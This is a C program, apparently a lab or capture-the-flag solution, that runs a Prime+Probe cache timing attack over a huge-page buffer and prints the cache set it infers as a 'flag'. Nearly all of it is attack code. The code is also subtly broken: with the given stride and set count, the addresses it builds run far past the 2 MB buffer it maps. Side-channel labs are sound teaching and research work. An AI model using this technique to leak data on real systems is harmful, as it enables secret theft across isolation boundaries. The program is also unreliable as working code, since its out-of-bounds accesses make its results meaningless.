#include "util.h"
#include <sys/mman.h>
#include <stdint.h>
#include <stdio.h>

#define BUFF_SIZE (2*1024*1024)
#define NUM_SETS 1024
#define STRIDE 65536
#define ROUNDS 500

int main(int argc, char const *argv[]) {

    int flag = -1;

    char *buf = mmap(NULL, BUFF_SIZE,
                     PROT_READ | PROT_WRITE,
                     MAP_POPULATE | MAP_ANONYMOUS |
                     MAP_PRIVATE | MAP_HUGETLB,
                     -1, 0);

    if (buf == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    buf[0] = 1;

    char *set_addr[NUM_SETS];
    uint64_t scores[NUM_SETS] = {0};

    for (int i = 0; i < NUM_SETS; i++) {
        set_addr[i] = buf + i * STRIDE;
    }

    for (int round = 0; round < ROUNDS; round++) {

        // PRIME
        for (int i = 0; i < NUM_SETS; i++) {
            *(volatile char*)set_addr[i];
        }

        // small delay
        for (volatile int i = 0; i < 100000; i++);

        // PROBE
        uint64_t max_time = 0;
        int candidate = -1;

        for (int i = 0; i < NUM_SETS; i++) {

            uint64_t t = measure_one_block_access_time((ADDR_PTR)set_addr[i]);

            if (t > max_time) {
                max_time = t;
                candidate = i;
            }
        }

        if (candidate >= 0) {
            scores[candidate]++;
        }
    }

    // find most frequent candidate
    int best_set = 0;
    uint64_t best_score = 0;

    for (int i = 0; i < NUM_SETS; i++) {
        if (scores[i] > best_score) {
            best_score = scores[i];
            best_set = i;
        }
    }

    flag = best_set;

    printf("Flag: %d\n", flag);

    return 0;
}